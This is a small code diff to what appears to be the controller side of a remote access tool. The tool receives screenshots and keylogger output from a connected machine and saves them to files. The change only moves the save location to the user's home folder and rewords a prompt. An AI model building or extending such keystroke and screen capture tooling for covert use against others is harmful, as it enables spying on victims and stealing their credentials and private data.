@@ -15,6 +15,8 @@ from src import errors, helper
 from src.definitions.commands import *
 from src.logger import LOGGER_ID
 
+HOME = os.path.expanduser("~")
+
 
 class Control:
     def __init__(self, _server):
@@ -215,7 +217,7 @@ class Control:
 
             data = self.es.recvall(buffer)
 
-            file = f"{os.getcwd()}{os.path.sep}{time.strftime('scrn_%Y%m%d_%H%M%S.png')}"
+            file = f"{HOME}{os.path.sep}{time.strftime('scrn_%Y%m%d_%H%M%S.png')}"
 
             try:
                 with open(file, "wb") as objPic:
@@ -253,7 +255,7 @@ class Control:
             keylog = self.es.recvall(rsp["value"]["buffer"]).decode()
 
             try:
-                file_name = f"{os.getcwd()}/{time.strftime('keylog_%Y%m%d_%H%M%S.txt')}"
+                file_name = f"{HOME}{os.path.sep}{time.strftime('keylog_%Y%m%d_%H%M%S.txt')}"
                 with open(file_name, "w") as _file:
                     _file.write(keylog)
                 self.logger.info(f"Saved to {file_name}")
@@ -271,7 +273,7 @@ class Control:
 
         max_file_size = -1
 
-        input_file_size = input("Max file size kB ([ENTER] for infinite): ")
+        input_file_size = input("Max file size kB ([ENTER] for unlimited): ")
 
         if input_file_size != "":
             try:
